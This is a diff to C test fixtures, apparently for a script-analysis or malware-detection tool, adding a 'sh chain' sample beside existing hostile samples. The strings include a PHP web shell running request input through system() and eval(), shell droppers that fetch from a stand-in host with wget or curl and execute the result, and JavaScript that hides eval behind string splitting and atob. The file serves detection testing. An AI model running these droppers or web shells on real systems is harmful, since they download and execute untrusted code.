@@ -106,6 +106,10 @@ static struct prog P[] = {
 	  "<?php $x = $_GET[0]; function f($a, $b){ global $x; return g($b); } function g($c){ system($c); return $c; } function h(){ function i(){ eval($x); } }\nsystem(f($_POST[0], $_POST[1]));\n" },
 	{ "sh dropper", KGENOME_TEXTUAL_LANG_SH, 1,
 	  "#!/bin/sh\nx=/tmp/a\ny=ev\nz=al\nwget -O $x http://e.com/x\nchmod +x $x\nsh $x\n$y$z \"$(echo hi | base64 -d)\"\ncurl http://e.com/p | sh\n" },
+	/* WP9-F17: a variable chain makes the shell reader build its table; a refused allocation there was not said. Old tests
+	 * missed it: (b) the "sh dropper" has three variables and no chain, so the reader's table was never the thing refused. */
+	{ "sh chain", KGENOME_TEXTUAL_LANG_SH, 1,
+	  "a0=/tmp/f\na1=$a0\na2=$a1\nwget -O $a2 http://e.com/x\nchmod +x $a2\nsh $a2\n" },
 	{ "js arrows", KGENOME_TEXTUAL_LANG_JS, 1,
 	  "var a = atob(s); var f = 'ev' + 'al'; window[f](a); var g = (x) => { return eval(x); }; g(a); function h(p) { return p; } eval(h(a));\n" },
 	{ "vbs dim", KGENOME_TEXTUAL_LANG_VBS, 1,
